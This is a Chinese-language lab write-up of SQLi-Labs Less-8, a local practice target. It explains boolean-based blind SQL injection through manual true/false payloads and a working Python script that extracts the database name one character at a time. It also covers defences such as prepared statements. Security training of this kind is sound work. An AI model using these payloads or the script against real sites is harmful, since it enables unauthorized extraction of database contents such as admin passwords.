SQLi-Labs Less-8

2026年9月25日 SQLi-Labs Web安全 SQL注入 布尔盲注

一、题目信息

  • 题目名称：SQLi-Labs Less-8 (GET - Blind - Boolean Based - Single Quotes)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 布尔盲注
  • 靶场链接：http://localhost:8081/Less-8/（本地环境）
  • 涉及工具：Chrome浏览器、Python（requests库）

二、解题步骤

1. 分析题目考什么

本题的核心考点是布尔盲注（Boolean-Based Blind SQL Injection）。页面不仅没有数据回显，连 SQL 错误信息也不输出。服务器仅根据 SQL 查询的真假，向页面返回两种状态（真：You are in...........；假：空白）。攻击者必须通过构造布尔条件（如 `and 1=1` 与 `and 1=2`），观察页面状态差异，逐字符猜解数据。

2. 怎么想（破题思路）

  • 尝试 ?id=1' 发现页面无报错也无回显。
  • 尝试 ?id=1' and 1=1 --+ 回显 "You are in..."，而 ?id=1' and 1=2 --+ 页面空白。确认布尔盲注存在。
  • 由于无法直接查看结果，需要利用 length()、substr()、ascii() 等函数，把数据拆分成一个个字符，通过“真/假”页面来判断每个字符的具体值。
  • 由于手工猜解极度耗时，必须编写 Python 脚本进行自动化爆破。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：误以为没有回显就是没有漏洞

踩坑情况：输入单引号后，页面毫无反应，既没有报错，也没有数据。

原因分析：Less-8 为了防止报错，后端可能关闭了 display_errors，并且没有打印查询结果。但这并不代表 SQL 注入不存在，只是它变成了“盲注”。

改进方式：利用 and 1=1 和 and 1=2 测试页面的“真/假”状态，确认布尔盲注。

踩坑记录二：使用 Union 或报错注入均无效

踩坑情况：尝试 union select 1,2,3 --+ 或 updatexml()，页面既没有回显数字，也没有回显报错。

原因分析：Less-8 的后端代码逻辑极其简单，只判断查询是否成功，并输出一句静态文本。它忽略了所有查询结果和报错信息。

改进方式：必须放弃联合和报错注入，改用布尔盲注。

详细实操步骤（Python 脚本爆破）

第一步：手动测试布尔条件

?id=1' and 1=1 --+   (回显 "You are in...")
?id=1' and 1=2 --+   (页面空白)

逐字解析：' 闭合单引号，and 1=1 恒真条件，and 1=2 恒假条件。--+ 注释掉后面的代码。通过对比页面是否回显 "You are in..."，判断注入是否成功。

第二步：编写 Python 脚本自动化猜解

由于手动猜解效率极低，使用以下 Python 脚本，通过二分法或遍历 ASCII 码来猜解数据库名。

import requests

url = "http://localhost:8081/Less-8/?id=1'"
success_str = "You are in..........."

def get_length():
    for i in range(1, 30):
        payload = f" and length(database())={i} --+"
        r = requests.get(url + payload)
        if success_str in r.text:
            return i
    return 0

def get_database_name(length):
    name = ""
    for i in range(1, length + 1):
        for ascii_val in range(32, 127):
            payload = f" and ascii(substr(database(),{i},1))={ascii_val} --+"
            r = requests.get(url + payload)
            if success_str in r.text:
                name += chr(ascii_val)
                print(f"[+] 已猜解: {name}")
                break
    return name

print("[*] 正在获取数据库名长度...")
db_length = get_length()
print(f"[*] 数据库名长度为: {db_length}")

print("[*] 正在爆破数据库名...")
db_name = get_database_name(db_length)
print(f"[*] 数据库名称为: {db_name}")

代码逐字深度解析：

  • requests：导入 HTTP 请求库。
  • success_str：定义“真”状态的关键字。
  • length(database())：猜解数据库名的长度。
  • substr(database(), i, 1)：截取数据库名的第 i 个字符。
  • ascii()：将字符转为 ASCII 码，便于逐字符比对。
  • for ascii_val in range(32, 127)：遍历所有可打印字符的 ASCII 码。

预期结果：脚本运行后，自动打印出 security，证明布尔盲注成功。

4. 怎么迁移（跨领域联想）

  • DevOps 与自动化测试：布尔盲注的思维（通过单次二元状态推测整体信息）在自动化测试中非常常见，比如通过探测接口返回 200 或 500 状态码来推断系统的健康状态。
  • 信息论与二分查找：布尔盲注的猜解过程利用了二分查找（Binary Search）的思想，每次询问都将可能的答案空间缩小一半，这是计算机科学中最基础的算法思想之一。
  • 安全开发（SDL）：必须使用预编译语句，不要让数据库报错信息回显到前端，同时要严格控制数据库账号权限，彻底杜绝注入。

三、名词大全与原理深度复盘

1. 布尔盲注（Boolean-Based Blind SQLi）

指攻击者在页面没有回显或报错的情况下，通过构造 SQL 条件（真/假），利用 Web 页面响应状态的差异，一个字符一个字符地猜解数据库数据的技术。

2. 常用函数

  • length(str)：返回字符串的长度。
  • substr(str, pos, len)：截取字符串，从第 pos 位开始，截取 len 个字符。
  • ascii(char)：返回字符的 ASCII 码值。

3. 盲注脚本的编写逻辑

脚本的核心是遍历。先猜长度，再循环每一个字符位置，然后遍历所有可能的 ASCII 值（通常取 32 到 126 的可打印字符），通过判断 success_str 是否存在于响应内容中，来确认当前猜解是否正确。

4. 为什么不建议手动盲注？

猜解一个 8 位的数据库名，如果每个字符平均需要尝试 60 次，总请求量高达 480 次。手动操作不仅耗时，还会因为频繁请求导致服务器封禁。自动化脚本可以瞬间完成。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-1 到 Less-4 的区别：前四关是联合注入，页面有回显位；Less-8 是布尔盲注，页面没有任何数据回显。
  • 与 Less-5/6 的区别：Less-5/6 是报错注入，页面会输出 SQL 错误信息；Less-8 连错误信息都不输出，只能靠真/假状态判断。
  • 与 Less-7 的区别：Less-7 是写文件 GetShell；Less-8 是纯数据猜解。

2. 这种题目的出现原因

开发人员为了防止报错信息泄露，关闭了 PHP 的 display_errors，并且没有打印查询结果。他们认为“只要不输出任何信息，攻击者就无从下手”，却忽略了 SQL 条件判断真伪导致的响应差异，依然会泄露数据。

3. 这种应用在实际中如何体现？

在真实渗透中，布尔盲注常用于无法直接回显数据的隐蔽注入点。攻击者会编写 Python 脚本，结合二分法，快速推算出管理员密码、敏感数据。自动化工具（如 SQLMap）的核心功能之一就是高效实现盲注。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个“不会说话的黑箱”：

  • Less-1（联合注入）：你问黑箱“密码是什么”，它直接把密码写在屏幕上告诉你。
  • Less-5（报错注入）：黑箱不告诉你密码，但如果你把问题写错格式，它会大声报错，把密码喊出来。
  • Less-8（布尔盲注）：黑箱既不回显也不报错，它只会对你的问题点头（显示 "You are in..."）或者摇头（空白）。你只能问：“密码的第一个字母是 a 吗？”（摇头）、“是 b 吗？”（摇头）……直到它点头，你就猜对了一个字母。
